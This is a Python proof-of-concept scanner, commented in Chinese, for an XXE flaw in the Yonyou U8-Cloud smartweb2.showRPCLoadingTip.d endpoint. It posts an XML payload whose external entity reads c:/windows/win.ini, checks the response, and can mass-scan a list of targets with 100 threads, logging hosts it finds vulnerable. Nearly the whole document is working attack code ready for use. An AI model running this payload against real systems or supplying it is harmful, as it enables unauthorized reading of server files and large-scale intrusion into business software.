#用友U8-Cloud smartweb2.showRPCLoadingTip.d接口存在XXE

import argparse,requests,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    pass

def main():
    banner()
    parser = argparse.ArgumentParser(description="用友U8-Cloud smartweb2.showRPCLoadingTip.d接口存在XXE 附POC")
    parser.add_argument('-u','--url',dest='url',type=str,help="input your url")
    parser.add_argument('-f','--file',dest='file',type=str,help='input file path')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open('url.txt','r',encoding='utf-8')as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h") 

def poc(target):
    url_payload = '/hrss/dorado/smartweb2.showRPCLoadingTip.d?skin=default&__rpc=true&windows=1'
    url = target + url_payload
    headers = {
        "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)", 
        "Accept-Encoding": "gzip, deflate", 
        "Accept": "*/*", 
        "Connection": "close", 
        "Content-Type": "application/x-www-form-urlencoded"
        }
    data = {"__type": "updateData", "__viewInstanceId": "nc.bs.hrss.rm.ResetPassword~nc.bs.hrss.rm.ResetPasswordViewModel", "__xml": "<!DOCTYPE z [<!ENTITY test  SYSTEM \"file:///c:/windows/win.ini\" >]><rpc transaction=\"1\" method=\"resetPwd\"><def><dataset type=\"Custom\" id=\"dsResetPwd\"><f name=\"user\"></f></dataset></def><data><rs dataset=\"dsResetPwd\"><r id=\"1\" state=\"insert\"><n><v>1</v></n></r></rs></data><vps><p name=\"__profileKeys\">&test;</p></vps></rpc>"}
    
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }

    try:
        response = requests.post(url=url,headers=headers,data=data,proxies=proxies,timeout=10,verify=False)
        if response.status_code == 200 and 'xml' in response.text and 'version' in response.text and 'extensions' in response.text:
            print( f"[+] {target} 存在XXE漏洞！")
            with open('result.txt','a',encoding='utf-8')as f:
                f.write(target + '\n')
                return True
        else:
            print(f"[-] {target} 不存在漏洞！")
    except Exception:
        print(f"[*] {target} 网站存在访问问题，请手工测试")

if __name__ == '__main__':
    main()